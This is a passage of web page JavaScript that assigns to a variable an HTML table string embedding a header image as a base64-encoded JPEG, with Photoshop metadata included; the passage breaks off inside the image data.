		var stroka = "<tr><td valign='top'><table width='100%' height='70' cellpadding='0' cellspacing='0' border='0'><tr><td width='766'><img src='data:image/jpeg;base64,/9j/4QY0RXhpZgAASUkqAAgAAAAMAAABAwABAAAA/gIAAAEBAwABAAAAPQAAAAIBAwADAAAAngAAAAYBAwABAAAAAgAAABIBAwABAAAAAQAAABUBAwABAAAAAwAAABoBBQABAAAApAAAABsBBQABAAAArAAAACgBAwABAAAAAgAAADEBAgAiAAAAtAAAADIBAgAUAAAA1gAAAGmHBAABAAAA7AAAACQBAAAIAAgACACA/AoAECcAAID8CgAQJwAAQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpADIwMTY6MDY6MjAgMjA6MzU6NDQAAAAEAACQBwAEAAAAMDIyMQGgAwABAAAA//8AAAKgBAABAAAA/gIAAAOgBAABAAAAPQAAAAAAAAAAAAYAAwEDAAEAAAAGAAAAGgEFAAEAAAByAQAAGwEFAAEAAAB6AQAAKAEDAAEAAAACAAAAAQIEAAEAAACCAQAAAgIEAAEAAACqBAAAAAAAAEgAAAABAAAASAAAAAEAAAD/2P/tAAxBZG9iZV9DTQAC/+4ADkFkb2JlAGSAAAAAAf/bAIQADAgICAkIDAkJDBELCgsRFQ8MDA8VGBMTFRMTGBEMDAwMDAwRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAENCwsNDg0QDg4QFA4ODhQUDg4ODhQRDAwMDAwREQwMDAwMDBEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8AAEQgADQCgAwEiAAIRAQMRAf/dAAQACv/EAT8AAAEFAQEBAQEBAAAAAAAAAAMAAQIEBQYHCAkKCwEAAQUBAQEBAQEAAAAAAAAAAQACAwQFBgcICQoLEAABBAEDAgQCBQcGCAUDDDMBAAIRAwQhEjEFQVFhEyJxgTIGFJGhsUIjJBVSwWIzNHKC0UMHJZJT8OHxY3M1FqKygyZEk1RkRcKjdDYX0lXiZfKzhMPTdePzRieUpIW0lcTU5PSltcXV5fVWZnaGlqa2xtbm9jdHV2d3h5ent8fX5/cRAAICAQIEBAMEBQYHBwYFNQEAAhEDITESBEFRYXEiEwUygZEUobFCI8FS0fAzJGLhcoKSQ1MVY3M08SUGFqKygwcmNcLSRJNUoxdkRVU2dGXi8rOEw9N14/NGlKSFtJXE1OT0pbXF1eX1VmZ2hpamtsbW5vYnN0dXZ3eHl6e3x//aAAwDAQACEQMRAD8A9FyMW2/Ix7hkOq9El1tTS6HhzmOY1+1zG/Rpez3t/PsS9G6rdZbmfomAlxeytu0Cd26wbGt2+1VaTgftXJ9EM/aWyv7TBdu2R+i7bP5vb9H/AINSyDR9ktkH097Z9Mnf6u6v7P6Wn876/o+n+Z++gKs1vpadev08kxbb7XjMDq3iWllTXSD7Wn1BuZ7nKXp3x/P2fH0B/wCQVC/7N9hxtgIxob6PpFh0j28/o/8AM/PSf9k9WzdPqbj6kT9KT/39ImV6AfatJl0F/V0Wh4pex1lhseCG2eiAWE6Ncxmzb/25vSf6s/ozZtj91zdfzvbH9pZrPsfu2Tugbud0a7Ppe795Q/UIM7ts990dv+ihcv3R9qLn+6Ptdpl7g0B1by4DU7TqpC4uEip/4D8pWN+qbR9LbJmZ5jXdu/kIwOD6DN4l2z9HJcHxLtm3a0s3bv5tK5dh9qrl2H2up6j/APRP/D/ySXqP/wBE/wDD/wAkqLjh+h7m/otwj3Wzu3fmQ31fp/uKpWel+o+W2z39R18Tuf8AyN3+f+Z6f/CJy52fUf8A6J3/AEf/ACSXqOHNTh82/wDklkz0eRDR9FsbXXRs2fovoN2el6X82mtPRfd6zW7dw3b3XbN0+36TfT+l9BJTr+o//RP/AA/8kl6j/wDRP/D/AMks0npv2hst/T7vbLrp3bv6v0t6PNOzRvtn27XWzO3/AAW1v7v7iSm36j/9E/8AD/ySXqP/ANE/8P8AySBjGv1X+g1m/Xfq/wAf5TdqsTkfus+8/wDkUlLeo/8A0T/w/wDJJeo//RP/AA/8knnI/dZ95/8AIpTkfus+8/8AkUlLeo//AET/AMP/ACSXqP8A9E/8P/JJ5yP3Wfef/IpTkfus+8/+RSU//9n/7Q4SUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAA8cAVoAAxslRxwCAAACpmEAOEJJTQQlAAAAAAAQ10ikXY7xtuYQrTI8sN+GhDhCSU0EOgAAAAAA9wAAABAAAAABAAAAAAALcHJpbnRPdXRwdXQAAAAFAAAAAFBzdFNib29sAQAAAABJbnRlZW51bQAAAABJbnRlAAAAAEltZyAAAAAPcHJpbnRTaXh0ZWVuQml0Ym9vbAAAAAALcHJpbnRlck5hbWVURVhUAAAAAQAAAAAAD3ByaW50UHJvb2ZTZXR1cE9iamMAAAAVBB8EMARABDAEPAQ1BEIEQARLACAERgQyBDUEQgQ+BD8EQAQ+BDEESwAAAAAACnByb29mU2V0dXAAAAABAAAAAEJsdG5lbnVtAAAADGJ1aWx0aW5Qcm9vZgAAAAlwcm9vZkNNWUsAOEJJTQQ7AAAAAAItAAAAEAAAAAEAAAAAABJwcmludE91dHB1dE9wdGlvbnMAAAAXAAAAAENwdG5ib29sAAAAAABDbGJyYm9vbAAAAAAAUmdzTWJvb2wAAAAAAENybkNib29sAAAAAABDbnRDYm9vbAAAAAAATGJsc2Jvb2wAAAAAAE5ndHZib29sAAAAAABFbWxEYm9vbAAAAAAASW50cmJvb2wAAAAAAEJja2dPYmpjAAAAAQAAAAAAAFJHQkMAAAADAAAAAFJkICBkb3ViQG/gAAAAAAAAAAAAR3JuIGRvdWJAb+AAAAAAAAAAAABCbCAgZG91YkBv4AAAAAAAAAAAAEJyZFRVbnRGI1JsdAAAAAAAAAAAAAAAAEJsZCBVbnRGI1JsdAAAAAAAAAAAAAAAAFJzbHRVbnRGI1B4bEBSAAAAAAAAAAAACnZlY3RvckRhdGFib29sAQAAAABQZ1BzZW51bQAAAABQZ1BzAAAAAFBnUEMAAAAATGVmdFVudEYjUmx0AAAAAAAAAAAAAAAAVG9wIFVudEYjUmx0AAAAAAAAAAAAAAAAU2NsIFVudEYjUHJjQFkAAAAAAAAAAAAQY3JvcFdoZW5QcmludGluZ2Jvb2wAAAAADmNyb3BSZWN0Qm90dG9tbG9uZwAAAAAAAAAMY3JvcFJlY3RMZWZ0bG9uZwAAAAAAAAANY3JvcFJlY3RSaWdodGxvbmcAAAAAAAAAC2Nyb3BSZWN0VG9wbG9uZwAAAAAAOEJJTQPtAAAAAAAQAEgAAAABAAIASAAAAAEAAjhCSU0EJgAAAAAADgAAAAAAAAAAAAA/gAAAOEJJTQQNAAAAAAAEAAAAHjhCSU0EGQAAAAAABAAAAB44QklNA/MAAAAAAAkAAAAAAAAAAAEAOEJJTScQAAAAAAAKAAEAAAAAAAAAAjhCSU0D9QAAAAAASAAvZmYAAQBsZmYABgAAAAAAAQAvZmYAAQChmZoABgAAAAAAAQAyAAAAAQBaAAAABgAAAAAAAQA1AAAAAQAtAAAABgAAAAAAAThCSU0D+AAAAAAAcAAA/////////////////////////////wPoAAAAAP////////////////////////////8D6AAAAAD/////////////////////////////A+gAAAAA/////////////////////////////wPoAAA4QklNBAAAAAAAAAIAAjhCSU0EAgAAAAAABgAAAAAAADhCSU0EMAAAAAAAAwEBAQA4QklNBC0AAAAAAAIAADhCSU0ECAAAAAAAEAAAAAEAAAJAAAACQAAAAAA4QklNBB4AAAAAAAQAAAAAOEJJTQQaAAAAAAM9AAAABgAAAAAAAAAAAAAAPQAAAv4AAAAEADIAUQA9AD0AAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAv4AAAA9AAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAEAAAAAAABudWxsAAAAAgAAAAZib3VuZHNPYmpjAAAAAQAAAAAAAFJjdDEAAAAEAAAAAFRvcCBsb25nAAAAAAAAAABMZWZ0bG9uZwAAAAAAAAAAQnRvbWxvbmcAAAA9AAAAAFJnaHRsb25nAAAC/gAAAAZzbGljZXNWbExzAAAAAU9iamMAAAABAAAAAAAFc2xpY2UAAAASAAAAB3NsaWNlSURsb25nAAAAAAAAAAdncm91cElEbG9uZwAAAAAAAAAGb3JpZ2luZW51bQAAAAxFU2xpY2VPcmlnaW4AAAANYXV0b0dlbmVyYXRlZAAAAABUeXBlZW51bQAAAApFU2xpY2VUeXBlAAAAAEltZyAAAAAGYm91bmRzT2JqYwAAAAEAAAAAAABSY3QxAAAABAAAAABUb3AgbG9uZwAAAAAAAAAATGVmdGxvbmcAAAAAAAAAAEJ0b21sb25nAAAAPQAAAABSZ2h0bG9uZwAAAv4AAAADdXJsVEVYVAAAAAEAAAAAAABudWxsVEVYVAAAAAEAAAAAAABNc2dlVEVYVAAAAAEAAAAAAAZhbHRUYWdURVhUAAAAAQAAAAAADmNlbGxUZXh0SXNIVE1MYm9vbAEAAAAIY2VsbFRleHRURVhUAAAAAQAAAAAACWhvcnpBbGlnbmVudW0AAAAPRVNsaWNlSG9yekFsaWduAAAAB2RlZmF1bHQAAAAJ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RiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDozMzA3MGNlMi0zNzBkLTExZTYtOTM1Yi1iNTIyNGNhNDJhNmYiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NTRkZWYxYTctZWVlYi0xZTQyLThkMGUtNDBhMzFkNGFhMTIyIiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6MzY5MkM3RUYzMzYxMTFFNjkzQjRBNTIzRjMzRkE5RDkiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXA6Q3JlYXRlRGF0ZT0iMjAxNi0wNi0yMFQyMDoxOTowNiswMzowMCIgeG1wOk1vZGlmeURhdGU9IjIwMTYtMDYtMjBUMjA6MzU6NDQrMDM6MDAiIHhtcDpNZXRhZGF0YURhdGU9IjIwMTYtMDYtMjBUMjA6MzU6NDQrMDM6MDAiIGRjOmZvcm1hdD0iaW1hZ2UvanBlZyIgcGhvdG9zaG9wOkNvbG9yTW9kZT0iMyI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkE0MDU0OTE2MzAxQjExRTY5M0I5RkUzMTQzN0MzMTZCIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkE0MDU0OTE3MzAxQjExRTY5M0I5RkUzMTQzN0MzMTZCIi8+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249InNhdmVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOmUyMzBiY2FlLWUyOTgtODA0YS1iZDBhLTkxZWQ1ZWYyYWQ3YyIgc3RFdnQ6d2hlbj0iMjAxNi0wNi0yMFQyMDozNTo0NCswMzowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpIiBzdEV2dDpjaGFuZ2VkPSIvIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDo1NGRlZjFhNy1lZWViLTFlNDItOGQwZS00MGEzMWQ0YWExMjIiIHN0RXZ0OndoZW49IjIwMTYtMDYtMjBUMjA6MzU6NDQrMDM6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1IChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPHBob3Rvc2hvcDpEb2N1bWVudEFuY2VzdG9ycz4gPHJkZjpCYWc+IDxyZGY6bGk+eG1wLmRpZDozNjkyQzdFRjMzNjExMUU2OTNCNEE1MjNGMzNGQTlEOTwvcmRmOmxpPiA8L3JkZjpCYWc+IDwvcGhvdG9zaG9wOkRvY3VtZW50QW5jZXN0b3JzPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg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